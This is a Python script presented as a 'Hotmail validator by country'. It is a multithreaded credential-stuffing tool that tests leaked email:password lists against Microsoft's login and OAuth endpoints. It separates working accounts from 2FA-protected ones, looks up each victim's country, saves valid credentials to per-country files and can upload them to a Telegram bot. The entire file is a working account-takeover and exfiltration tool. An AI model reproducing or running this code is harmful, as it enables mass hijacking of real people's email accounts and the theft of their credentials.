import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE

# Configuration
MY_SIGNATURE = "@keithkeizzah"
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# Global counters and locks
lock = threading.Lock()
hit = 0
bad = 0
secured = 0
retry = 0
total_combos = 0
processed = 0
country_stats = {}  # Dictionary: {country_name: count}
current_checking = ""
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)
start_time = None

def display_banner():
    """Display the script banner"""
    banner = f"""
{Y}█░█ █▀█ ▀█▀ █▀▄▀█ ▄▀█ █ █░░   █░█ ▄▀█ █░░ █ █▀▄ ▄▀█ ▀█▀ █▀█ █▀█
{Y}█▀█ █▄█ ░█░ █░▀░█ █▀█ █ █▄▄   ▀▄▀ █▀█ █▄▄ █ █▄▀ █▀█ ░█░ █▄█ █▀▄
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Y}        DEVELOPED BY : {M}{MY_SIGNATURE}
{Y}        TOOL         : {R}HOTMAIL VALIDATOR BY COUNTRY
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    print(banner)

def get_flag(country_name):
    """Get country flag emoji"""
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳️'

def update_display():
    """Update live display - EXACTLY like the image"""
    global hit, bad, secured, retry, processed, total_combos, country_stats, current_checking, start_time
    
    with lock:
        # Calculate progress
        progress_percent = min((processed / total_combos * 100), 100) if total_combos > 0 else 0
        
        # Calculate CPM
        elapsed = time.time() - start_time if start_time else 1
        cpm = int((processed / elapsed) * 60) if elapsed > 0 else 0
        
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        display_banner()
        
        # Status Box
        print(f"{W}┌{'─' * 55}┐")
        print(f"│ {Y}⚡ Status: {W}Checking...{' ' * 30}  │")
        print(f"├{'─' * 55}┤")
        print(f"│{G}✓Hits {W}│ {G}{hit:<46}{W} │")
        print(f"│{R}✗Bad {W}│ {R}{bad:<46}{W}  │")
        print(f"│{Y}Secured {W}│{Y}{secured:<46}{W}│")
        print(f"│{C}Retries{W}│ {C}{retry:<46}{W}│")
        print(f"├{'─' * 55}┤")
        
        # Progress
        print(f"│ {C}Progress: {progress_percent:.1f}% ({processed}/{total_combos}){' ' * (34 - len(f'{progress_percent:.1f}% ({processed}/{total_combos})'))}{W}          │")
        print(f"│ {B}Speed: {cpm} CPM{' ' * (48 - len(f'Speed: {cpm} CPM'))}{W}      │")
        print(f"├{'─' * 55}┤")
        
        # Countries Table
        if country_stats:
            print(f"│ {M}🌍 Countries:{' ' * 41}{W}│")
            print(f"├{'─' * 55}┤")
            
            # Sort countries by count (descending)
            sorted_countries = sorted(country_stats.items(), key=lambda x: x[1], reverse=True)
            
            for country, count in sorted_countries[:15]:  # Show top 15
                flag = get_flag(country)
                country_display = f"{flag} {country}"
                
                # Format line
                padding = 54 - len(country_display) - len(str(count))
                print(f"│ {G}{country_display}{W}: {count} {' ' * 41}│")
            
            print(f"├{'─' * 55}┤")
        
        # Current checking
        if current_checking:
            email_display = current_checking[:54] if len(current_checking) > 54 else current_checking
            padding = 56 - len(email_display)
            print(f"│{C}{email_display}{' '*padding}{W}│")
        
        print(f"└{'─' * 55}┘")

def save_hit_by_country(email, password, country):
    """Save hit to country-specific file"""
    # Create Results folder
    if not os.path.exists("Results"):
        os.makedirs("Results")
    
    # Safe country name for filename
    safe_country = country.replace(" ", "_").replace("/", "_")
    filename = os.path.join("Results", f"{safe_country}_hits.txt")
    
    # Add header if new file
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f:
            flag = get_flag(country)
            f.write(f"# {flag} {country} Accounts\n")
            f.write(f"# Created by {MY_SIGNATURE}\n")
            f.write(f"# Channel: https://t.me/keithtechsupport\n")
            f.write(f"# Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"#\n\n")
    
    # Save account
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")
    
    # Update country stats
    with lock:
        if country in country_stats:
            country_stats[country] += 1
        else:
            country_stats[country] = 1

def get_profile_info(token, cid):
    """Get profile info including country"""
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive"
        }
        
        response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=20
        ).json()
        
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        
        return country
    except:
        return 'Unknown'

def check_account(email, password):
    """Check Microsoft/Hotmail account"""
    global hit, bad, secured, retry, processed, current_checking
    
    # Update current checking
    with lock:
        current_checking = email
    
    try:
        session = requests.Session()
        
        # Step 1: IDP Check
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            with lock:
                bad += 1
                processed += 1
            update_display()
            return "BAD"
        
        # Step 2: OAuth
        url2 = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}&response_type=code&"
            f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&"
            f"scope=profile%20openid%20offline_access&"
            f"redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            with lock:
                bad += 1
                processed += 1
            update_display()
            return "BAD"
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        # Step 3: Login
        login_data = (
            f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&"
            f"passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&i19=9960"
        )
        
        r3 = session.post(
            post_url,
            data=login_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
            timeout=15
        )
        
        # Check errors
        if any(x in r3.text.lower() for x in ["incorrect", "error", "wrong"]):
            with lock:
                bad += 1
                processed += 1
            update_display()
            return "BAD"
        
        # Check 2FA
        if any(x in r3.text.lower() for x in ["proofup", "enforce", "verify"]):
            with lock:
                secured += 1
                processed += 1
            update_display()
            return "SECURED"
        
        # Step 4: Get code
        location = r3.headers.get("Location", "")
        if not location or "code=" not in location:
            with lock:
                retry += 1
                processed += 1
            update_display()
            return "RETRY"
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            with lock:
                bad += 1
                processed += 1
            update_display()
            return "BAD"
        
        code = code_match.group(1)
        
        # Step 5: Get token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access"
        }
        
        r4 = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            timeout=15
        )
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            with lock:
                bad += 1
                processed += 1
            update_display()
            return "BAD"
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        # Get CID
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value.upper()
                break
        
        if not mspcid:
            mspcid = str(uuid.uuid4()).upper()
        
        # Step 6: Get country
        country = get_profile_info(access_token, mspcid)
        
        # Save
        save_hit_by_country(email, password, country)
        
        with lock:
            hit += 1
            processed += 1
        
        update_display()
        return "HIT"
        
    except requests.exceptions.Timeout:
        with lock:
            retry += 1
            processed += 1
        update_display()
        return "RETRY"
    
    except Exception as e:
        with lock:
            retry += 1
            processed += 1
        update_display()
        return "RETRY"

def worker(combo):
    """Worker thread"""
    global checked_accounts
    
    try:
        email, password = combo.strip().split(':', 1)
        
        # Avoid duplicates
        if email in checked_accounts:
            return
        
        with lock:
            checked_accounts.add(email)
        
        # Rate limiting
        with rate_limit_semaphore:
            check_account(email, password)
            time.sleep(0.05)
            
    except:
        pass

def send_to_telegram(file_path, country_name):
    """Send file to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            files = {'document': f}
            flag = get_flag(country_name)
            caption = (
                f"{flag} <b>{country_name} Accounts</b>\n\n"
                f"💎 {MY_SIGNATURE}\n"
                f"📱 https://t.me/keithtechsupport"
            )
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.status_code == 200
    except:
        return False

def main():
    global total_combos, start_time
    
    display_banner()
    
    # Get settings
    combo_file = input(f"{C}Enter combo file path: {W}").strip()
    
    if not os.path.exists(combo_file):
        print(f"{R}❌ File not found!{W}")
        return
    
    threads_input = input(f"{C}Threads (default 10): {W}").strip()
    threads = int(threads_input) if threads_input.isdigit() else 10
    threads = max(1, min(threads, 100))
    
    # Telegram (optional)
    print(f"\n{C}Telegram (optional - Enter to skip):{W}")
    bot_token = input(f"{C}Bot Token: {W}").strip()
    chat_id = input(f"{C}Chat ID: {W}").strip()
    
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
    if bot_token and chat_id:
        TELEGRAM_BOT_TOKEN = bot_token
        TELEGRAM_CHAT_ID = chat_id
        print(f"{G}✅ Telegram enabled{W}")
    
    # Load combos
    print(f"\n{C}Loading combos...{W}")
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line]
    
    total_combos = len(combos)
    print(f"{G}✅ Loaded {total_combos} combos{W}")
    print(f"{C}Threads: {threads}{W}\n")
    
    input(f"{Y}Press Enter to start...{W}")
    
    # Start time
    start_time = time.time()
    
    # Initial display
    update_display()
    
    # Start checking
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(worker, combos)
    
    # Final display
    update_display()
    
    # Duration
    duration = time.time() - start_time
    
    # Summary
    print(f"\n{W}{'═' * 60}")
    print(f"{G}✅ CHECKING COMPLETED!{W}")
    print(f"{W}{'═' * 60}")
    print(f"{C}Total Checked : {total_combos}{W}")
    print(f"{G}Hits Found    : {hit}{W}")
    print(f"{R}Bad Accounts  : {bad}{W}")
    print(f"{Y}Secured (2FA) : {secured}{W}")
    print(f"{C}Retries       : {retry}{W}")
    print(f"{B}Duration      : {duration/60:.1f} min{W}")
    print(f"{W}{'═' * 60}\n")
    
    # Send to Telegram
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and os.path.exists("Results"):
        print(f"{C}Sending to Telegram...{W}\n")
        
        for filename in os.listdir("Results"):
            if filename.endswith("_hits.txt"):
                file_path = os.path.join("Results", filename)
                country_name = filename.replace("_hits.txt", "").replace("_", " ")
                
                print(f"{C}→ {country_name}...{W}")
                if send_to_telegram(file_path, country_name):
                    print(f"{G}✅ Sent{W}")
                else:
                    print(f"{R}❌ Failed{W}")
                
                time.sleep(1)
        
        print(f"\n{G}✅ All files sent!{W}")
    
    print(f"\n{G}Results saved in: Results/{W}")
    print(f"{M}💎 {MY_SIGNATURE}{W}")
    print(f"{C}📱 https://t.me/keithtechsupport{W}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{R}❌ Stopped{W}")
    except Exception as e:
        print(f"\n{R}❌ Error: {e}{W}")
